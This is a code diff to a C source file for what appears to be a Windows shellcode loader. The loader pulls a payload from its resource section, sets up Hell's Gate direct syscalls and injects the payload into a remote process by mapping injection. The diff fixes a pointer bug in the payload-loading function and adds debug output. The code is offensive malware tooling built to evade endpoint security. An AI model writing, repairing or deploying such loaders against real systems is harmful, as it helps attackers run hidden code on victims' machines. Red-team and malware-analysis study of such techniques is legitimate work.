@@ -1,7 +1,8 @@
 #include "Resource.h"
 #include "HellsGate.h"
+#include "Common.h"
 
-BOOL GetPayloadFromResource(OUT PVOID pPayloadAddress, OUT SIZE_T* pPayloadSize) {
+BOOL GetPayloadFromResource(OUT PVOID* ppPayloadAddress, OUT SIZE_T* pPayloadSize) {
 	HRSRC		hRsrc = NULL;
 	HGLOBAL		hGlobal = NULL;
 
@@ -22,8 +23,8 @@ BOOL GetPayloadFromResource(OUT PVOID pPayloadAddress, OUT SIZE_T* pPayloadSize)
 	}
 
 	// Get the address of our payload in .rsrc section
-	pPayloadAddress = LockResource(hGlobal);
-	if (pPayloadAddress == NULL) {
+	*ppPayloadAddress = LockResource(hGlobal);
+	if (*ppPayloadAddress == NULL) {
 		// in case of function failure 
 		printf("[!] LockResource Failed With Error : %d \n", GetLastError());
 		return FALSE;
@@ -44,10 +45,13 @@ int main() {
 	PVOID pPayloadAddress = NULL;
 	SIZE_T sPayloadSize = 0;
 
-	if (GetPayloadFromResource(pPayloadAddress, &sPayloadSize) != TRUE) {
+	if (GetPayloadFromResource(&pPayloadAddress, &sPayloadSize) != TRUE) {
 		printf("[!] Failed To Get Payload From The Resource Section\n");
 		return -1;
 	}
+	printf("[+] Get Payload To %p Address With Size = %d\n", pPayloadAddress, (INT)sPayloadSize);
+
+	PrintHexData("ResourcePayload", pPayloadAddress, sPayloadSize);
 
 	InitializeSyscalls();
 	RemoteMappingInjectionViaSyscalls(
